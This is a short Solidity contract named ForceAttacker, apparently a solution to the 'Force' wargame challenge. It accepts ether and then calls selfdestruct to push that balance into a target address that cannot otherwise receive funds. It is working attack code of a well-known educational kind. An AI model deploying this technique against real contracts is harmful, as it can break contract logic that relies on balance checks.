// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    address payable public forceAddress;

    constructor(address payable _addr) {
        forceAddress = _addr;
    }

    function triggerDestruct() public {
        selfdestruct(forceAddress);
    }

    receive() external payable {}
}
